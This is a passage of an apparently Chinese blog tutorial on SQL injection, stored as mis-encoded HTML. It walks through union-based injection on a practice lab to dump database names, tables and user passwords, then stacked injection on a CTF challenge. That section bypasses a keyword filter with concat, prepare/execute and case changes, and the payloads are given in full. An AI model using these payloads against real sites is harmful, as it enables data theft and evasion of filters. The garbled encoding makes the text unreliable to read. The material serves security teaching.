è¯­å¥çš„æ–¹å¼æ³„éœ²æ•°æ®åº“ä¿¡æ¯ï¼Œæˆ–è€…ç›´æ¥å¢åˆ æ”¹æŸ¥æ•°æ®åº“ã€‚</li><li>æŠ¥é”™æ³¨å…¥ï¼šé€šè¿‡ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°æŠ¥é”™æŠŠä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚</li><li>äºŒæ¬¡æ³¨å…¥ï¼šå’•å’•å’•</li></ol><h4 id="è”åˆæŸ¥è¯¢çš„æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢çš„æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢çš„æ³¨å…¥"></a>è”åˆæŸ¥è¯¢çš„æ³¨å…¥</h4><p>åˆ©ç”¨è¦æ±‚ï¼šæœ‰å›æ˜¾</p><p>å‡å¦‚ä½ æ˜¯ <code>admin</code> ç™»å½•ä¹‹åï¼Œå®ƒé¡µé¢å¯èƒ½ä¼šæ˜¾ç¤º <code>hello,admin</code>ã€‚é‚£ä¹ˆè¿™ä¸ª <code>hello</code> åé¢å°±æ˜¯ä¸€ä¸ªå›æ˜¾çš„ç‚¹ï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨æ¥æ³„éœ²å…¶å®ƒä¿¡æ¯ã€‚è¿™é‡Œéœ€è¦æ€ä¹ˆç†è§£å‘¢ï¼Œå‡å¦‚å®ƒåœ¨ç™»å½•çš„é€»è¾‘æ˜¯è¿™æ ·å†™çš„ï¼š</p><p><code>select username,passowrd from data.user where username=&#39;$input_username&#39; and password=&#39;$input_password&#39;;</code><br>ç„¶åæˆ‘ä»¬åˆ¤æ–­ä½ çš„è´¦å·å¯†ç æ˜¯å¦æ­£ç¡®å°±ä¸»è¦çœ‹å®ƒæ˜¯å¦èƒ½æŸ¥æ‰¾åˆ°è®°å½•ï¼Œå¦‚æœæ‰¾åˆ°ï¼Œé‚£ä¹ˆæˆ‘é€‰å–è¿™æ¡è®°å½•çš„ç¬¬ä¸€ä¸ªè®°å½•çš„ <code>username</code> å­—æ®µï¼Œç„¶åè¾“å‡ºè¿™ä¸ªï¼Œå°±è¾¾åˆ°äº†å®ƒæˆåŠŸç™»å½•äº†ä»€ä¹ˆè´¦å·ï¼Œæˆ‘è¾“å‡ºé‚£ä¸ªè´¦å·çš„ç›®çš„äº†ã€‚</p><p>è‡³äºä¸Šé¢ä¸ºä»€ä¹ˆè¯´æ˜¯ç¬¬ä¸€æ¡è®°å½•å‘¢ï¼Œè¿™é‡Œä½ éœ€è¦è¿™ä¹ˆçœ‹ï¼š<code>select</code> çš„è¿”å›ç»“æœå¯èƒ½æœ‰å¾ˆå¤šï¼Œè€Œä¸ç®¡å®ƒè¿”å›äº†ä¸€æ¡è¿˜æ˜¯å¤šæ¡å®ƒéƒ½æ˜¯ä¸€ä¸ªæ•°æ®é›†ï¼Œæ˜¯ä¸ªäºŒç»´çš„è¡¨ã€‚å› æ­¤é€‰æ‹©ç¬¬ä¸€æ¡è®°å½•æ˜¯å¼€å‘äººå‘˜é»˜è®¤ä¼šåŠ ä¸Šçš„ï¼Œæ­¤æ—¶æˆ‘åªéœ€ä½¿å¾—å‰é¢çš„è¯­å¥æŸ¥è¯¢å¤±è´¥ï¼ˆè¿”å›ç©ºæ•°æ®é›†ï¼‰å¹¶é€‰å–å…¶å®ƒå†…å®¹ç”¨ <code>union</code> åˆå¹¶è¿™ä¸ªæ•°æ®é›†ï¼Œå¹¶æŠŠè¿™é‡Œçš„å…¶å®ƒå†…å®¹æ›¿æ¢æˆæˆ‘æƒ³çŸ¥é“çš„å†…å®¹ï¼Œæ¯”å¦‚å®ƒçš„æ•°æ®åº“åï¼Œè¡¨åï¼Œç„¶åå®ƒè¿™é‡Œå°±ä¼šåŸæ ·è¾“å‡ºè¿™äº›ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬å°±çŸ¥é“äº†ã€‚è¿™é‡Œéœ€è¦çŸ¥é“ <code>union</code> æ˜¯åˆå¹¶ä¸¤ä¸ªæ•°æ®é›†çš„ï¼Œå› æ­¤ä¸¤ä¸ªæ•°æ®é›†çš„å®½åº¦ï¼ˆå­—æ®µæ•°ï¼‰å¿…é¡»ä¸€æ ·ï¼Œæ•°æ®ç±»å‹å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿”å› <code>php</code> å¤„ç†ä¹‹åéƒ½ä¼šå˜æˆå­—ç¬¦ä¸²ç±»å‹å…¶å®ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æ‹¿åˆšåˆšæ­å»ºçš„ç¯å¢ƒçš„ç¬¬ä¸€å…³æ¥åšæµ‹è¯•ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å¯»æ‰¾æµ‹è¯•ç‚¹äº†ï¼Œå®ƒè¿™é‡Œå·²ç»è´´å¿ƒåœ°æé†’æˆ‘ä»¬ç”¨ <code>get</code> ä¼ ä¸€ä¸ª <code>id</code> å‚æ•°è¿›å»äº†ï¼Œå› æ­¤æˆ‘ä»¬å…ˆè¯• <code>1</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/8.png" alt="8"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘è¾“å…¥ä¸€ä¸ª <code>1</code> å®ƒç›´æ¥è´´å¿ƒçš„å‘Šè¯‰äº†æˆ‘ä»¬è´¦å·å’Œå¯†ç æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œæ˜¾ç¤ºçš„è´¦å·å’Œå¯†ç å°±æ˜¯å›æ˜¾çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬å†æµ‹è¯•è¿™ä¸ªå‚æ•°æ˜¯å¦èƒ½æ³¨å…¥ï¼Œæœ€ç®€å•æœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯æ‰“ä¸ªå•å¼•å·æˆ–è€…åŒå¼•å·è¿›å»ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/9.png" alt="10"></p><p>å¯ä»¥å‘ç°æ•°æ®åº“æŠ¥é”™ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªå‚æ•°æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬ç”¨åˆšåˆšæåˆ°çš„æ–¹æ³•ï¼Œå…ˆå¦å‰ä¸€ä¸ªè¯­å¥æŸ¥è¯¢å¤±è´¥ï¼ˆç©ºæ•°æ®é›†ï¼‰ï¼Œç„¶åå† <code>union</code> ä¸Šä¸€ä¸ªæ•°æ®é›†ï¼Œè¿™ä¸ªæ•°æ®é›†æ˜¯æˆ‘ä»¬ä»»ä½•æˆ‘ä»¬æƒ³æ³„éœ²çš„ä¿¡æ¯ï¼Œé¦–å…ˆæˆ‘ä»¬å‡è£…å¯¹æ•°æ®åº“ä¸€æ— æ‰€çŸ¥ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯è¦çŸ¥é“è¿™é‡Œæœ‰å¤šå°‘æ•°æ®åº“ï¼Œåˆ†åˆ«ä»€ä¹ˆåå­—ã€‚</p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯å¯ä»¥ç•¥å¾®çŒœæµ‹ä¸€ä¸‹å®ƒçš„å†™æ³• <code>select username,password from xxx.yyy where id=&#39;$input_id&#39; limit 0,1</code></p><p>æˆ‘ä»¬å…ˆç”¨å¼•å·é—­åˆå‰é¢çš„å‚æ•°ï¼Œç„¶ååé¢åŠ ä¸Šä¸€ä¸ª <code>and 1=0</code> è®©å‰é¢çš„æ•°æ®é›†å¿…ä¸ºç©ºï¼Œç„¶åå† <code>union select 1,2--+</code> ï¼Œè¿™é‡Œéœ€è¦æµ‹è¯•å‚æ•°çš„ä¸ªæ•°ï¼Œå› ä¸ºä½ ä¸çŸ¥é“å‰é¢æœ‰å‡ ä¸ªå­—æ®µï¼Œä¸è¿‡è¿™é‡Œå¯ä»¥å§‘ä¸”å…ˆçŒœä¸ª <code>2</code>ï¼Œå› ä¸ºç›®å‰çœ‹æ¥å°±æ‰¾äº†è´¦å·å’Œå¯†ç å˜›ï¼Œæœ€åç”¨ <code>--+</code> å»æ³¨é‡Šåé¢çš„å•å¼•å·ã€‚ç»“æœå‘ç°æ•°æ®åº“æŠ¥äº†è¿™ä¸ªé”™è¯¯ï¼š<code>The used SELECT statements have a different number of columns</code>ï¼Œè¿™ä¸ªä¹Ÿä¸éš¾çœ‹å‡ºæ¥æ˜¯å› ä¸º <code>union</code> å‰åçš„æ•°æ®é›†å«æœ‰ä¸åŒçš„åˆ—æ•°ï¼Œä¹Ÿå°±æ˜¯å­—æ®µæ•°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡Œä¸æ˜¯ä¸¤ä¸ªï¼Œé‚£æˆ‘ä»¬æ¢æˆ <code>3</code> ä¸ªå‚æ•°å†çœ‹çœ‹ï¼Œå¦‚æœä¸è¡Œå°±æ¥ç€æ¢ï¼ŒçŸ¥é“ä¸æŠ¥è¿™ä¸ªé”™è¯¯ä¸ºæ­¢ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/10.png" alt="11"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç»“æœå‡ºæ¥äº†ï¼Œé‚£ä¹ˆå‰é¢æ˜¯æœ‰ä¸‰åˆ—çš„ï¼Œå¹¶ä¸”è´¦å·åœ¨ç¬¬äºŒåˆ—ï¼Œå¯†ç åœ¨ç¬¬ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—å¤§æ¦‚ç‡æ˜¯è¿™ä¸ª <code>id</code> äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æœç€è¿™å‡ ä¸ªå›æ˜¾çš„åœ°æ–¹å»æ”¹å‚æ•°ï¼Œæ¯”å¦‚æˆ‘æƒ³çŸ¥é“æ•°æ®åº“åï¼Œå°±ç”¨å‰é¢çš„æ–¹æ³•ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦çŸ¥é“ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯å›æ˜¾çš„åœ°æ–¹è¿™é‡Œåªèƒ½å­˜åœ¨ä¸€æ¡è®°å½•ï¼Œå¦‚æœå­˜åœ¨å¤šæ¡è®°å½•å°†æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘å¯ä»¥æŠŠ <code>2</code> æ›¿æ¢æˆ <code>select xxx from zzzx.yyy</code> ä½†æ˜¯å¿…é¡»ä¿è¯ç»“æœé›†åªèƒ½å«æœ‰ä¸€æ¡è®°å½•ä¸€ä¸ªå­—æ®µï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ä¸€ä¸ªå­—æ®µæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸€æ¡è®°å½•çš„è¯ï¼Œä½ ä¼šæƒ³åˆ° <code>limit</code>ï¼Œå¯ä»¥ï¼Œä½†æ˜¯å¤ªæ…¢äº†ï¼Œå¦‚æœæ•°æ®è®°å½•å¾ˆå¤šä¸€æ¡ä¸€æ¡æ‰“è¦ç´¯æ­»äººï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°ä¹‹å‰è®²è¿‡çš„èšåˆå‡½æ•° <code>group_concat</code>ï¼Œèšåˆå‡½æ•°ä¼šæŠŠæ‰€æœ‰è®°å½•æ•´åˆæˆä¸€æ¡è®°å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½ä¸€æ¬¡è¾“å‡ºå¤šæ¡è®°å½•çš„ä¿¡æ¯ï¼Œé‚£ç®€ç›´ä¸€ä¸¾å¤šå¾—äº†ã€‚</p><p>æˆ‘ä»¬å¼€å§‹æŠ¥æ•°æ®åº“åå§ <code>select schema_name from information_schema.schemata</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/11.png" alt="12"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çˆ†å‡ºäº†å½“å‰æ•°æ®åº“åå’Œæ‰€æœ‰æ•°æ®åº“åï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨æ›¿æ¢ä¸ºè¯­å¥çš„æ—¶å€™ï¼Œè¯­å¥ä¸€å®šè¦åŠ ä¸Šæ‹¬å·ï¼Œä¸ç„¶å®ƒçš„ <code>sql</code> ä¼šåˆ†æå¤±è´¥ã€‚</p><p>ç„¶åæˆ‘ä»¬çˆ†ä¸€ä¸‹ <code>security</code> æ•°æ®åº“çš„ä¿¡æ¯ï¼Œå…ˆçˆ†è¡¨åï¼Œå…¶å®åªéœ€è¦æ›¿æ¢ä¸€ä¸‹å°±å¯ä»¥äº†ï¼š<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/12.png" alt="13"></p><p>æˆ‘ä»¬ä¸»è¦æ”¶é›†ä¸€ä¸‹ç”¨æˆ·ä¿¡æ¯å§ï¼Œæ‰€ä»¥çœ‹çœ‹ <code>users</code> æ•°æ®è¡¨çš„å†…å®¹ï¼Œæˆ‘ä»¬å…ˆè·å–å­—æ®µåï¼Œä¸€æ ·ä¸€æ ·åœ°å¾€ä¸Šå¥—å°±å®Œäº‹äº†ï¼š<code>select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/13.png" alt="13"></p><p>ç„¶åæˆ‘ä»¬è¿™é‡Œæˆ‘ä»¬å°±çœ‹åˆ°äº†æ‰€æœ‰çš„å­—æ®µåï¼Œæˆ‘ä»¬è¿™é‡Œç‚¹åˆ°ä¸ºæ­¢ï¼ŒæŠŠæ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç çˆ†å‡ºæ¥å°±ç»“æŸå§ã€‚</p><p><code>select group_concat(username) from security.users</code> å’Œ <code>select group_concat(password) from security.users</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p><p>å¥½ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬å°±æŠŠæ•°æ®åº“çš„ä¿¡æ¯æˆåŠŸè·å–åˆ°äº†ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è”åˆæŸ¥è¯¢æ³¨å…¥ååˆ†æ–¹ä¾¿ï¼Œå‡ æ­¥åˆ°ä½å¯ä»¥æŠŠæ•°æ®åº“å…¨éƒ¨æ³„éœ²å‡ºæ¥ï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶ä¸€èˆ¬æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æœ‰å›æ˜¾ç‚¹æ‰èƒ½å®ç°ã€‚</p><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><p>å †å æ³¨å…¥çš„åŸç†å°±æ˜¯ä½¿ç”¨å¼•å·éš”å¼€å‰ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼Œå†è‡ªå·±ä¹¦å†™å¦å¤–çš„ <code>sql</code> è¯­å¥ä»¥æ­¤è¾¾åˆ°ä»»æ„æ‰§è¡Œ <code>sql</code> è¯­å¥çš„ç›®çš„ã€‚ç”±äºç»“æœå¾ˆéš¾å›æ˜¾ï¼Œæˆ‘ä»¬ä¸€èˆ¬è¿™ä¸ªç”¨çš„ä¸å¤šï¼Œå› ä¸ºæˆ‘ä»¬ä¸»è¦è¿˜æ˜¯è·å–ä¿¡æ¯ä¸ºä¸»ï¼Œè€Œä¸æ˜¯è¦å»ä¿®æ”¹å®ƒçš„æ•°æ®åº“ã€‚</p><p>è¿™ä¸ªæ¼”ç¤ºæˆ‘ä»¬ç”¨ <code>buuctf</code> é‡Œé¢çš„ä¸€é“é¢˜å§ï¼Œæ˜¯æ¥è‡ª2019å¼ºç½‘æ¯çš„ä¸€é“é¢˜ç›®ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p><p>å…ˆä¸ç®¡å®ƒæ€ä¹ˆè¯´ï¼Œæœ‰æäº¤çª—å£å…ˆæ­£å¸¸æäº¤çœ‹çœ‹å®ƒåŸæœ¬çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/16.png" alt="16"></p><p>çœ‹è¿™ä¸ªè¾“å‡ºæ ¼å¼ï¼Œåº”è¯¥ä¹Ÿæ˜¯ä»æ•°æ®åº“é‡ŒæŒ‰ç…§ä¸€ä¸ªåº”è¯¥æ˜¯ <code>id</code> å­—æ®µæŸ¥è¯¢ï¼ŒæŸ¥è¯¢ç»“æœä¸ºä¸¤ä¸ªå­—æ®µï¼Œç„¶åç”¨ <code>var_dump</code> è¾“å‡ºç¬¬ä¸€æ¡è®°å½•çš„ä¿¡æ¯ï¼Œç„¶åæŒ‰ç…§å›½é™…æƒ¯ä¾‹åŠ ä¸ªåˆ†å·çœ‹å®ƒæ˜¯å¦æŠ¥é”™ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/17.png" alt="17"></p><p>æŠ¥é”™äº†è¯´æ˜æœ‰æ³¨å…¥ç‚¹ã€‚</p><p>æˆ‘ä»¬å½“ç„¶è¿˜æ˜¯å…ˆè¯•è¯•è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œç”¨ <code>1&#39; union select 1,2--+</code>ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°å®ƒå›æ˜¾äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>å®ƒè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—å¯¼è‡´æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¹¶ä¸”æ­£åˆ™åé¢çš„ <code>/i</code> è¡¨ç¤ºå¤§å°å†™å…¨åŒ¹é…ï¼Œé‚£çœ‹æ¥å®ƒæ˜¯ä¸æƒ³è®©ä½ ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œæˆ‘ä»¬ä¸å¦¨å…ˆè¯•è¯•å †å æ³¨å…¥ã€‚æˆ‘ä»¬å¯ä»¥å…ˆå» <code>mysql</code> è¿æ¥é‡Œé¢è‡ªå·±è¯•è¯•å †å æ³¨å…¥ï¼Œæ¯”å¦‚æˆ‘å…ˆå®ç°ä¸€ä¸ªé€»è¾‘ï¼Œè¿™ä¸ªé€»è¾‘ä»…ä»…æ˜¯æŸ¥è¯¢æ¯ä¸ªæ•°æ®åº“çš„è¡¨ï¼Œé‚£ä¹ˆæ•°æ®åº“å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å°±æ˜¯è¿™ä¹ˆå†™ <code>sql</code>  è¯­å¥çš„ï¼š<code>select table_name from information_schema.tables where table_schema=&#39;$input_database&#39;;</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/18.png" alt="18"></p><p>å¯ä»¥çœ‹åˆ°éšä¾¿è¾“å…¥ä¸€ä¸ªæ•°æ®åº“å¯ä»¥å®ç°åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®© <code>$input_database=1&#39;;show databases;--</code>ï¼Œç»è¿‡æ‹¼æ¥ä¹‹åå½¢æˆäº†ï¼š</p><p><code>select table_name from information_schema.tables where table_schema=&#39;1&#39;;show databases;--&#39;;</code>ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨å‚æ•°ä¸­è¾“å…¥äº†å…¶å®ƒçš„ <code>sql</code> è¯­å¥ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹ç»“æœå¦‚ä½•å‘¢ï¼Ÿä¸å‡ºæ„å¤–åœ°æ‰§è¡Œäº†æˆ‘ä»¬è¾“å…¥çš„ <code>show databases</code> æŒ‡ä»¤ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/19.png" alt="19"></p><p>æ‰€ä»¥ä½ ä¹Ÿå°±æ¸…æ¥šäº†å †å æ³¨å…¥æ˜¯æ€ä¹ˆä¸€å›äº‹ï¼Œæˆ‘ä»¬è¯•è¯•çœ‹ï¼Œä¸€èˆ¬é¢˜ç›®é‡Œé¢å †å æ³¨å…¥éƒ½æ²¡æœ‰å¾ˆå¥½çš„å›æ˜¾ï¼Œä½†æ˜¯è¿™é¢˜å®ƒæœ‰ï¼Œè‡³äºä¸ºä»€ä¹ˆèƒ½æœ‰æˆ‘ä»¬ç­‰ä¼šå¯ä»¥åˆ†æä¸€ä¸‹å®ƒé¢˜ç›®çš„æºç ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/20.png" alt="20"></p><p>å†é€šè¿‡ <code>show tables</code> æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸¤å¼ è¡¨ <code>1919810931114514</code> å’Œ <code>words</code>ã€‚ç„¶åæˆ‘ä»¬ä¸‹ä¸€æ­¥å¯ä»¥ç”¨ <code>show columns from table_name</code> çš„æ–¹å¼å»æ˜¾ç¤ºè¡¨ä¸­æ‰€æœ‰çš„å­—æ®µåã€‚å…ˆçœ‹çœ‹ <code>words</code> è¡¨ï¼Œå‘ç°æœ‰ <code>id</code> å’Œ <code>data</code> å­—æ®µï¼Œè¿™é‡Œå¤§èƒ†ç‚¹çŒœæµ‹ï¼Œæˆ‘ä»¬åº”è¯¥æ˜¯æ ¹æ® <code>id</code> å»æŸ¥è¯¢ <code>data</code>ã€‚å®ƒçš„ <code>sql</code> è¯­å¥å¤§æ¦‚æ˜¯ <code>select data from supersqli.words where id=&#39;$input_id&#39;</code>ã€‚</p><p>è¿™é‡Œä¸€ä¸ªçƒ«èŠå£«æ³¨æ„ä¸€ä¸‹å•Šï¼Œå°±æ˜¯å½“æ•°æ®åº“åæˆ–è¡¨åæˆ–åˆ—åå¯èƒ½å¼•èµ·æ­§ä¹‰çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åå¼•å·å°†å…¶åŒ…è£¹ã€‚æ¯”å¦‚ä½  <code>select 1,2,3</code> æˆ‘å¹¶ä¸çŸ¥é“ä½ æƒ³æ‰¾çš„æ˜¯ 1,2,3 ä¸‰ä¸ªæ•°å€¼è¿˜æ˜¯è¿™ 1,2,3 æ˜¯åˆ—åã€‚é‚£ä¹ˆä¸ºäº†æ¶ˆé™¤è¿™ä¸ªæ­§ä¹‰æˆ‘ä»¬åœ¨è¿™ä¸ªæ—¶å€™ä½¿ç”¨åå¼•å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `1`,`2`,`3`</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å†™æ³•å°±æ˜¯è¡¨ç¤º 1,2,3 ä»£è¡¨åˆ—åï¼Œåå¼•å·åœ¨é”®ç›˜ä¸Šæ•°å­— <code>1</code> çš„å·¦è¾¹ã€‚</p><p>è¿™é‡Œå› ä¸ºæ˜¯å…¨æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå¼•å·æ‰èƒ½æ˜¾ç¤ºå‡ºå®ƒæ‰€æœ‰çš„åˆ—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ª <code>flag</code> åˆ—ã€‚é‚£ <code>flag</code> åº”è¯¥æ˜¯åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥è¯¢å‡ºå®ƒï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨åˆ°å †å æ³¨å…¥çš„å¦ä¸€ç§å§¿åŠ¿ï¼šé¢„ç¼–è¯‘ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå…ˆæ¥çœ‹çœ‹é¢„ç¼–è¯‘çš„ä¸€èˆ¬ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=&#x27;show databases&#x27;;</span><br><span class="line">prepare ext from @sql;</span><br><span class="line">execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/21.png" alt="21"></p><p>å¯ä»¥å‘ç°å®ƒæˆåŠŸæ‰§è¡Œäº† <code>show databases</code>ï¼Œä½ å¯èƒ½ä¼šè§‰å¾—ä¸€ä¸¾ä¸¤å¾—äº†ï¼Œä½†æ˜¯è¿™å¯¹äºæˆ‘ä»¬ç»•è¿‡ <code>WAF</code> è¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ï¼Œå®ƒä¸è®©å‡ºç° <code>select</code> è¿™ä¸ªå•è¯çš„ä»»æ„å¤§å°å†™å½¢å¼ï¼Œæˆ‘ä»¬å°±ç”¨å‰é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•° <code>concat</code> å°±å¯ä»¥ä¸å‡ºç° <code>select</code> å•è¯ä½†æ˜¯èƒ½æ‰§è¡Œ <code>select</code> è¯­å¥ã€‚</p><p>æˆ‘ä»¬è¿˜æ˜¯åœ¨è¿™ä¸ª <code>cmd</code>  é‡Œé¢å»è¿è¡Œã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/22.png" alt="22"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åˆ©ç”¨ <code>concat</code> å‡½æ•°å’Œé¢„ç¼–è¯‘çš„æ–¹å¼åœ¨å…¨è¯­å¥æ²¡æœ‰å‡ºç°è¿‡ <code>select</code> çš„æƒ…å†µä¸‹ä½¿ç”¨äº† <code>select</code> è¯­å¥æ‰èƒ½å¹²çš„äº‹ã€‚</p><p>å› ä¸ºåœ¨ <code>php</code> é‡Œé¢ï¼Œæ‰§è¡Œè¯­å¥çš„æ—¶å€™æ‰ä¼šäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œ <code>sql</code> è¯­å¥ï¼Œè¯­å¥ç»“æŸè¿›ç¨‹ä¹Ÿå°±ç»“æŸï¼Œå¦‚æœæˆ‘å…ˆ <code>set @sql=&#39;xxx&#39;</code> é‚£ä¹ˆå†æ¬¡æŸ¥è¯¢ä¸ä¼šä¿å­˜è¿™ä¸ªå˜é‡çš„ç»“æœï¼Œè¿™é‡Œå°±éœ€è¦æŠŠå¤šæ¡è¯­å¥æ•´åˆæˆä¸€æ¡ï¼Œè¿™ä¹Ÿæ˜¯å †å æ³¨å…¥ç‰¹æœ‰çš„ä¸€ä¸ªä¼˜åŠ¿å§ã€‚</p><p>æˆ‘ä»¬çš„ <code>payload</code> å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰“è¿›å»çš„æ—¶å€™å‘ç° <code>WAF</code> è¿˜æœ‰ä¸€å±‚æ£€æµ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ˆå¥½ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°å®ƒåˆ¤æ–­å¤§å°å†™çš„ï¼Œæˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªå…³é”®å­—éšä¾¿ä¸€ä¸ªå­—ç¬¦å¤§å†™å³å¯ç»•è¿‡ï¼Œæˆ‘ä»¬æœ€åçš„ <code>payload</code> å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);Prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/23.png" alt="23"></p><p>æˆåŠŸè·å¾— <code>flag</code>ã€‚</p><p>å †å æ³¨å…¥è¿˜æœ‰ä¸€ä¸ªå¾ˆå‰å®³çš„å§¿åŠ¿å°±æ˜¯ä¿®æ”¹æ•°æ®åº“ï¼Œä½†æ˜¯è¯·æ³¨æ„ä¸è¦åˆ åº“ï¼Œå› ä¸ºè¿™æ ·çš„è¯ä½ å¯èƒ½å°±æ‹¿ä¸åˆ° <code>flag</code>ã€‚å¦‚æœæ‹¿å®Œ <code>flag</code> å†æŠŠ <code>flag</code> åˆ äº†ï¼Œå¦‚æœç¯å¢ƒä½ ä¸“ç”¨ä½ 